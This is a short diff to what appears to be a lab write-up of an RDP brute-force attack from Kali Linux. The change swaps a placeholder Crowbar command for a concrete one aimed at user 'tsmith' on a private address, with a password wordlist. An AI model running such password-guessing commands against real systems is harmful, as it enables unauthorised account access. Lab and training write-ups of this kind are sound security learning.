@@ -44,9 +44,10 @@ Using **Kali Linux**, I launched an automated brute-force attack against the Win
 * **Tool:** Crowbar
 * **Wordlist:** `rockyou.txt`
 
+**Targeting user Terry Smith**
 ```bash
 # Command used for RDP brute force:
-crowbar -b rdp -s [Target_IP]/32 -u [Target_Username] -C rockyou.txt
+crowbar -b rdp -u tsmith -C passwords.txt -s 192.168.10.100/32
 ```
 
 > **Ref 3: Kali Attack Terminal**
